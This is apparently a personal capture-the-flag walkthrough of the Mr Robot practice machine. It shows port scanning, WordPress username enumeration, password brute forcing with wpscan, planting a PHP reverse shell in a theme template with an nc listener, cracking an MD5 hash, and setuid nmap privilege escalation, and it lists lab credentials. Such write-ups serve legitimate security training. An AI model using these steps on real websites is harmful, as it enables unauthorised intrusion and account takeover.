first running port scan on the target
# nmap 
open ports : 80,443,22
22/tcp  closed ssh      conn-refused
80/tcp  open   http     syn-ack      Apache httpd
443/tcp open   ssl/http syn-ack      Apache httpd
# Port 80 http
we get a web shell on the website

/prepare
/fsociety
/inform
/question
/wakeup
/join
/wp-login

# gobuster
website is running on wordpress
and found 
inside robots.txt
fsocity.dic
and the first flag
found /phpmyadmin but only accessible by local host
![[Pasted image 20211203170611.png]]
![[Pasted image 20211203171152.png]]

![[Pasted image 20211203171434.png]]

downloaded fsocity.dic file seems like it's a dictionary of passwords but has duplicates
we can remove duplicates by using uniq and sort 
```bash
sort fsocity.dic | uniq > newfsocity.dic
```

# wpscan 
```bash
wp scan --url mrrobot.vuln -e u 
```
# enumerating wordpress login


We can enumurate usernames by trying to login and because the error message tells us that the username exists or not we can create a username list using the characters inside MrRobot series because of this box's theme 

```
# username list
mrrobot
mr.robot
elliot 
Darlene
Tyrell
```
![[Pasted image 20221219160424.png]]
![[Pasted image 20221219160438.png]]

and we get a hit
now we can try to brute force the password with the file we downloaded earlier from robots.txt
using wpscan
```
wpscan --url mrrobot.vuln -U elliot -P ~/Downloads/newfsocity.dic
```
and we have valid creds
elliot:ER28-0652
 ![[Pasted image 20211203181631.png]]

# Web shell upload
 ![[Pasted image 20211203181734.png]]
we are inside wordpress now
first thing we should try to do is upload a php reverse shell inside themes editor 
first we open appearance and use the editor 
![[Pasted image 20211203183416.png]]
now let's get our php-reverse-shell 
used reverse shell:
[Pentestmonkey_php_reverse_shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
and use 404.php template and modify it's content and add our reverse shell
![[Pasted image 20211203183516.png]]
let's open  our listener on 4444
```bash
nc -lvnp 4444
```
and we try to access the page mrrobot.vuln/wp-content/themes/twentythirteen/404.php





#  Privesc: daemon –> robot 
let's start with getting stable shell
```
which python
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL Z
stty raw -echo
fg
enter
enter
export TERM=xterm
```
looking into home we find a directory called robot
![[Pasted image 20211203183931.png]]
we can access the password.raw-md5 file 
robot:c3fcd3d76192e4007dfb496cca67e13b
because it's md5 we can try to crack it using crackstation 
robot:abcdefghijklmnopqrstuvwxyz

![[Pasted image 20221219154332.png]]

![[Pasted image 20211203184909.png]]
# Privesc: robot –> System

![[Pasted image 20221219154511.png]]

we can use nmap interactive mode to get to the root user
![[Pasted image 20221219155359.png]]


<br><br><br><br>

<br><br><br><br>
# Conclusion
- Leaving important data inside /robots.txt
- Word was vulnerable to Password Brute forcing 
- Wordpress was vulnerable to  uploading reverse shell to the Themes templates
- stored password in home directory lead to compromising higher privileged user in the system
- using weak password encryption (MD5)
- having setuid on Binary file that lead to privilege escalation to root   
